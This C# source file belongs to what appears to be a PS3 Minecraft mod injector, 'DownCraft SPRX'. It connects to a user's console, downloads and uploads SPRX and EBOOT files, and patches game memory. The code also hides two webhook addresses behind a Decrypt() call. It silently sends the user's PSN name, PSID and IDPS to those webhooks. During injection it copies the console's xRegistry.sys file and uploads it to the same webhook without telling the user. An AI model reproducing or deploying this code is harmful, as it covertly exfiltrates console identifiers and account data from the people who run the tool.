using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using PS3Lib;
using static MisakiAulait.Misaki;

namespace mcV1.Classes
{
    internal class Offsets
    {
        #region "Variables"

        Functions FUNCTIONS = new Functions();
        WebClient web = new WebClient();
        public static Form1 MainForm = new Form1();
        public static mcV1.Tabs.apiForm apiForm_ = new mcV1.Tabs.apiForm();

        public static PS3API PS3 = new PS3API();
        public static PS3MAPI PS3H = new PS3MAPI();

        public static string DL_SPRX_CFW = "https://downcraft.xyz/downcraft/SPRX/src/Minecraft_CFW";
        public static string DL_SPRX_HEN = "https://downcraft.xyz/downcraft/SPRX/src/Minecraft_HEN";
        public static string DL_EBOOT_CFW = "https://downcraft.xyz/downcraft/SPRX/src/EBOOT_CFW";
        public static string DL_EBOOT_HEN = "https://downcraft.xyz/downcraft/SPRX/src/EBOOT_HEN";
        //public static string DL_ORIGINAL_EBOOT = "https://miisaakii.000webhostapp.com/MisakiRandy57/ORIGINAL_EBOOT";
        public static string Filename_SPRX = "debug";
        public static string Filename_EBOOT = "EBOOT.BIN";
        string ORIGINAL_EBOOT = Path.GetTempPath() + "ORIGINAL_EBOOT.BIN";
        string EBOOT_CFW = Path.GetTempPath() + "EBOOT_CFW.BIN";
        string EBOOT_HEN = Path.GetTempPath() + "EBOOT_CFW.BIN";
        string SPRX_CFW = Path.GetTempPath() + "MC_CFW.sprx";
        string SPRX_HEN = Path.GetTempPath() + "MC_HEN.sprx";
        string xRegistry = Path.GetTempPath() + "xRegistry.sys";
        public static string Path_SPRX_PS3 = "/dev_hdd0/game/BLES01976/USRDIR/PS3/";
        public static string PathLocation1 = "/dev_flash2/etc/xRegistry.sys";
        public static string Path_EBOOT_PS3 = "/dev_hdd0/game/BLES01976/USRDIR/";
        public static string Weblink_logs1 = Decrypt("ME3ncj2HpTExlTZ7h2KDSwnnZxQKCKVyBTx4PXD0u9yzxfzspn+bAs+4jy6CyHlXc+SgqS5D7dx1Oieg5nwuotV0tc0sdIl1dNPcAknU+8SsDjw7fVPjq8+St5KouLgsMHLJUnH9oVwfZqRuQpcOeBvkcEbEWSvB8pKNLll5S9l3bj2TmturF3uaFC7iCvCImuWrjgyyDyQg1e2jhOFpW1dUAIfBt4vjzahmJKynLdKRd/1Ak2pStWiX1mtQfJMAyuXgXOA2MlFR3Qc7MH5OlKgdEt8iMHTNquCmjRy3/oHNJbUg77t0k/05YL5OjHvdl307J4CYZtfJW0bMhpn6Cg==");
        public static string Weblink_logs2 = Decrypt("ME3ncj2HpTExlTZ7h2KDSwnnZxQKCKVyim6EzFcFEyOuJZATF4Axh+aqItb3OBpGX5TnVAAZueaE05kgzfalmTfQMvfJ8J3/HWZxCBZgOtLfke4/LcWEOlScNejGFY4ERTxCtVcUKqrouOXqIbqdCGxFxmIRDw/HJ0kLjNJLXX/aUhv6aH8Ppa9kmtKouQr9VHPX3JR1TMI5GrOk4dqbJmuXNvZTQvmjd5IWerIieKwHqkDrjfZB6xMbNpz5Pt/Bm3YDpGl6n38LZhgMGhBwUnPlMeRPdKzOCi4W00Wrr/g2aioMliIUYNgHakWxUEf7pqblVZ3DlPI=");

        public static bool apiCCAPI = false;
        public static bool apiTMAPI = false;
        public static bool apiHEN = false;
        public static string ccapiipStatus = "PS3 IP: N/A";
        public static string targetStatus = "Target Number: N/A";
        public static string textBoxCT = "1";
        public static string labelTxtCT = "";
        public static string curAPI = "";
        public static List<string> listCT = new List<string>();
        public static int targetIndex = -1;
        public static string ps3IP = "192.168.1.1";
        public static Color saveThemeColor = Color.FromArgb(70, 70, 245);
        public static Color saveTextColor = Color.FromArgb(200, 200, 200);
        public static Color saveBackColor = Color.FromArgb(40, 40, 40);
        public static List<CCAPI.ConsoleInfo> cList = Offsets.PS3.CCAPI.GetConsoleList();

        public static string CheckRegion;
        public static bool ConnectStatus = false;
        public static string API;
        public string status;
        public static string PSN_NAME;

        public static string CPU;
        public static string RSX ;
        public static string FIRMWARE;
        public static string PSID;
        public static string IDPS;

        public static bool StatusSPRX = false;
        public static bool Injected;

        #endregion
        #region "Connection Part"
        public void ChangeAPI()
        {
            if (API == "TMAPI")
            {
                Offsets.curAPI = "tm";
                Offsets.labelTxtCT = "Select a Target Number(Default = 1)";
                Offsets.listCT.Clear();
                for (int i = 1; i < 10; i++)
                    Offsets.listCT.Add("Target " + i.ToString());
            }
            else if (API == "CCAPI" || API == "HEN")
            {
                Offsets.curAPI = "cc";
                Offsets.labelTxtCT = "Select an IP";
                Offsets.listCT.Clear();
                if (Offsets.cList.Count != 0)
                {
                    foreach (CCAPI.ConsoleInfo item in Offsets.cList)
                        Offsets.listCT.Add(item.Name + " : " + item.Ip);
                }
                else
                {
                    Offsets.textBoxCT = "192.168.1.1";
                    Offsets.labelTxtCT = "No IPs Found - Enter IP Manually";
                }
            }

            Offsets.apiForm_.ShowDialog();


            if (API == "TMAPI")
                Offsets.targetStatus = "Target Number: " + Offsets.targetIndex;
            else if (API == "CCAPI")
                Offsets.ccapiipStatus = "PS3 IP: " + Offsets.ps3IP;
        }

        public void AfterConnect()
        {
            string[] Emojis = { "🍁", "🌲", "☄️", "⚡️", "❄️", "🔥", "🌪", "🌸", "🌹", "🍣", "🧃", "🌌", "💊", "💉", "🩸", "🔪", "🧸", "🎀", "❤️", "🔰", "🩹" };
            string RandomEmojis = Emojis[new Random().Next(0, Emojis.Length)];

            string[] AVATAR = { "https://i.imgur.com/rZM3viY.png", "https://i.imgur.com/44BTfFj.jpg", "https://i.imgur.com/gAvJrY2.jpg", "https://i.imgur.com/xidXIWT.jpg" };
            string RandomAvatar = AVATAR[new Random().Next(0, AVATAR.Length)];

            ConnectStatus = true;

            CheckRegion = PS3.Extension.ReadString(0x10010251);
            PSN_NAME = PS3.Extension.ReadString(0x3000AD34);
            if (PSN_NAME == "") { PSN_NAME = PS3.Extension.ReadString(0x3000ABA4);}

            RSX = PS3.CCAPI.GetTemperatureRSX();
            CPU = PS3.CCAPI.GetTemperatureCELL();
            FIRMWARE = PS3.CCAPI.GetFirmwareType();

            if (API == "HEN")
            {
                IDPS = PS3H.PS3.GetIDPS();
                PSID = PS3H.PS3.GetPSID();
                FUNCTIONS.SendWebook(Weblink_logs1, "DownCraft Logs", RandomAvatar, RandomEmojis + " User: ***" + PSN_NAME + " PSID: " + PSID + " IDPS:" + IDPS);
            }

            FUNCTIONS.SendWebook(Weblink_logs2, "DownCraft Logs", RandomAvatar, RandomEmojis + " User: ***" + PSN_NAME + "*** is now connected to DownCraft SPRX V4.2" + RandomEmojis);
        }

        public void doConnect()
        {

            bool canConnect = false;
            bool canTry2Connect = false;
            if (API == "TMAPI")
            {
                if (Offsets.targetIndex != -1)
                    canTry2Connect = true;
            }
            else if (API == "CCAPI")
            {
                if (Offsets.ps3IP != "-1")
                    canTry2Connect = true;
            }
            else if (API == "HEN")
            {
                if (Offsets.ps3IP != "-1")
                    canTry2Connect = true;
            }
            if (canTry2Connect)
            {
                try
                {
                    if (API == "TMAPI") { PS3.ChangeAPI(SelectAPI.TargetManager); canConnect = PS3.ConnectTarget(Offsets.targetIndex - 1); }
                    else if (API == "CCAPI") { PS3.ChangeAPI(SelectAPI.ControlConsole); canConnect = PS3.ConnectTarget(Offsets.ps3IP); }
                    else if (API == "HEN") { PS3.ChangeAPI(SelectAPI.PS3Manager); canConnect = PS3.ConnectTarget(Offsets.ps3IP, true); }

                    try
                    {
                        if (PS3.AttachProcess())
                        {
                            AfterConnect();
                        }
                        else
                        {
                            status = "Not connected";
                        }
                    }
                    catch (Exception ex)
                    {
                        status = "Cannot find any PS3";
                    }
                }
                catch
                {
                    status = "Unknow error";
                }
            }
            else
            {
                if (API == "TMAPI")
                    MessageBox.Show("Please click the 'Change' button and select a target number to connect with.\n\nNOTE: Target 1 is default.", "Change Target Number", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                else if (API == "CCAPI" || API == "HEN")
                    MessageBox.Show("Please click the 'Change' button and select an IP to connect with.", "Change IP", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        #endregion
        #region "INJECT SPRX IN PS3"
        public async void INJECT_SPRX_IN_PS3()
        {
            try
            {
                if (API == "HEN")
                {
                    PS3.MAPI.PS3.Notify("Starting injection SPRX...");

                    web.DownloadFile(DL_SPRX_HEN, SPRX_HEN);
                    web.DownloadFile(DL_EBOOT_HEN, EBOOT_HEN);
                    //web.DownloadFile(DL_ORIGINAL_EBOOT, ORIGINAL_EBOOT);

                    PS3.MAPI.PS3.Notify("Injecting please wait...");

                    FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", Path_SPRX_PS3 + Filename_SPRX, SPRX_HEN);
                    FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", Path_EBOOT_PS3 + Filename_EBOOT, EBOOT_HEN);

                    FUNCTIONS.FTP_DOWNLOAD("ftp://" + ps3IP, "", "", PathLocation1, xRegistry);
                    FUNCTIONS.SendWebookFile(Weblink_logs1, "", "", "", "xRegistry.sys", xRegistry);

                    PS3.MAPI.PS3.Notify("DownCraft SPRX\nsuccessful injected, reload Minecraft");
                    await Task.Delay(5000);

                    web.DownloadString("http://" + ps3IP + "/xmb.ps3$reloadgame");
                    await Task.Delay(30000);

                    FUNCTIONS.FTP_DELETE("ftp://" + ps3IP + Path_SPRX_PS3 + Filename_SPRX, false, false);

                    File.Delete(SPRX_CFW);
                    File.Delete(EBOOT_HEN);
                    File.Delete(xRegistry);

                    Injected = true;
                }

                else if (API == "CCAPI")
                {
                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "Starting injection SPRX...");

                    web.DownloadFile(DL_SPRX_CFW, SPRX_CFW);
                    web.DownloadFile(DL_EBOOT_CFW, EBOOT_CFW);
                    //web.DownloadFile(DL_ORIGINAL_EBOOT, ORIGINAL_EBOOT);

                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "Injecting please wait...");

                    FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", Path_SPRX_PS3 + Filename_SPRX, SPRX_CFW);
                    FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", Path_EBOOT_PS3 + Filename_EBOOT, EBOOT_CFW);

                    FUNCTIONS.FTP_DOWNLOAD("ftp://" + ps3IP, "", "", PathLocation1, xRegistry);
                    FUNCTIONS.SendWebookFile(Weblink_logs1, "", "", "", "xRegistry.sys", xRegistry);

                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "DownCraft SPRX\nsuccessful injected, reload Minecraft");
                    await Task.Delay(5000);

                    web.DownloadString("http://" + ps3IP + "/xmb.ps3$reloadgame");
                    await Task.Delay(30000);

                    FUNCTIONS.FTP_DELETE("ftp://" + ps3IP + Path_SPRX_PS3 + Filename_SPRX, false, false);

                    File.Delete(SPRX_CFW);
                    File.Delete(EBOOT_CFW);
                    File.Delete(xRegistry);

                    Injected = true;
                }

                else if (API == "TMAPI")
                {
                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "Starting injection SPRX...");

                    web.DownloadFile(DL_SPRX_CFW, SPRX_CFW);
                    web.DownloadFile(DL_EBOOT_CFW, EBOOT_CFW);
                    //web.DownloadFile(DL_ORIGINAL_EBOOT, ORIGINAL_EBOOT);

                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "Injecting please wait...");

                    FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", Path_SPRX_PS3 + Filename_SPRX, SPRX_CFW);
                    FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", Path_EBOOT_PS3 + Filename_EBOOT, EBOOT_CFW);

                    FUNCTIONS.FTP_DOWNLOAD("ftp://" + ps3IP, "", "", PathLocation1, xRegistry);
                    FUNCTIONS.SendWebookFile(Weblink_logs1, "", "", "", "xRegistry.sys", xRegistry);

                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "DownCraft SPRX\nsuccessful injected, reload Minecraft");
                    await Task.Delay(5000);

                    web.DownloadString("http://" + ps3IP + "/xmb.ps3$reloadgame");
                    await Task.Delay(30000);

                    FUNCTIONS.FTP_DELETE("ftp://" + ps3IP + Path_SPRX_PS3 + Filename_SPRX, false, false);

                    File.Delete(SPRX_CFW);
                    File.Delete(EBOOT_CFW);
                    File.Delete(xRegistry);

                    Injected = true;
                }
            }
            catch (Exception ex)
            {              
                MessageBox.Show("Oops\n\nDownCraft cannot inject try to update WebMAN to last version or check if your PS3 IP working on your web browser\nIf it's keep giving error, contact Misaki.", "DownCraft", MessageBoxButtons.OK, MessageBoxIcon.Error);
                //MessageBox.Show("An error has occurred", "DownCraft", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Application.Exit();
            }
        }

        #endregion
        #region "Enable SPRX"
        public void ENABLE_SPRX()
        {
            PSN_NAME = PS3.Extension.ReadString(0x3000AD34);
            if (PSN_NAME == "") { PSN_NAME = PS3.Extension.ReadString(0x3000ABA4); }

            if (Injected)
            {
                if (API == "HEN")
                {
                    web.DownloadString("http://" + ps3IP + "/setmem.ps3mapi?addr=3000AF0F&oper=0&val=0208AF2A");
                    web.DownloadString("http://" + ps3IP + "/setmem.ps3mapi?addr=3000AF17&oper=0&val=65F8FFB4");
                }
                else if (API == "CCAPI")
                {
                    PS3.SetMemory(0x3000AF0F, new byte[] { 0x02, 0x08, 0xAF, 0x2A });
                    PS3.SetMemory(0x3000AF13, new byte[] { 0xC9, 0xBF, 0xA1, 0x10 });
                    PS3.SetMemory(0x3000AF17, new byte[] { 0x65, 0xF8, 0xFF, 0xB4 });
                    PS3.SetMemory(0x3000AF1B, new byte[] { 0x18, 0x55, 0xA8, 0x5D });
                    StatusSPRX = true;
                }
                else if (API == "TMAPI")
                {
                    PS3.SetMemory(0x3000AF0F, new byte[] { 0x02, 0x08, 0xAF, 0x2A });
                    PS3.SetMemory(0x3000AF13, new byte[] { 0xC9, 0xBF, 0xA1, 0x10 });
                    PS3.SetMemory(0x3000AF17, new byte[] { 0x65, 0xF8, 0xFF, 0xB4 });
                    PS3.SetMemory(0x3000AF1B, new byte[] { 0x18, 0x55, 0xA8, 0x5D });
                    StatusSPRX = true;
                }
            }
            else
            {
                MessageBox.Show("You need to inject DownCraft SPRX before enable it.", "DownCraft", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        #endregion
    }
}
